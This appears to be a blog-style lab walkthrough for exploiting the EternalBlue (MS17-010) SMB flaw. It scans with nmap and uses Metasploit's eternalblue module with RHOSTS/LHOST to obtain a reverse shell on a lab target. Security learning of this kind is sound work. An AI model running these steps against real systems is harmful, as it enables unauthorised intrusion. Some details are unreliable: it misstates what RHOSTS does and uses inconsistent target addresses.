---
title: "Eternal Blue Exploit"
excerpt: "finding out and exploiting smb on port 445"
date: 2025-07-23
tags: [nmap, exploits, eternalblue, wanacry]
layout: single
author_profile: true
---
### What Is EternalBlue?

ternalBlue (tracked as MS17–010) is a vulnerability in Microsoft’s Server Message Block (SMB) protocol, 
specifically on port 445. SMB helps devices on a network (like printers and file servers) 
communicate with each other.

The National Security Agency (NSA) originally discovered this vulnerability and created an 
exploit for it. Eventually, it was leaked and adapted by hackers into the WannaCry ransomware,
causing global havoc.

steps are as follows:

1. run nmap -p 445 10.10.50.15 on your target to confirm that SMB (port 445) is open because
 EternalBlue attacks the SMB service.
2. Check vulnerability by running sudo nmap -sV -vv --script vuln 10.10.50.15. In the host script
 results you would see something like ost script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   **VULNERABLE:**
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: **VULNERABLE**

3. Start metasploit by running **msfconsole** in your terminal
4. Your vulnerability was ms17-010 as per the above report , so tun **search ms17-010**
    or just do **search scanner eternalblue**
   The exploitation code is exploit/windows/smb/ms17_010_eternalblue so use the exploit by running
   exploit/windows/smb/ms17_010_eternalblue
5.  Run **show option** to see the required value which is **RHOSTS** This tells Metasploit who the target is.
6.  INterminal , **set RHOSTS 10.10.7.58** then enter. This tells Metasploit where to receive the reverse shell.
7.  check your LHOST by running ip a | grep tun0, it is inet 10.23.144.37/16 scope global tun0
8.  also set alhost ie **set LHOST 10.23.144.37**
9.  run the exploit **run** after it runs, you may need to press **enter** to make it show prompt
    i.e **C:\Windows\System32>** if you wish you may try command like
      whoami
      hostname
      ipconfig       to prove the RHOST terminal is now displaying on your side

11.  While still in the shell (where you see C:\Windows\system32>), press: CTLL + Z,
    This will return you to the Metasploit console (msf6 >),
     while keeping that session active in the background. Run commands like sessions -i 85 later
      to go back into the shell.

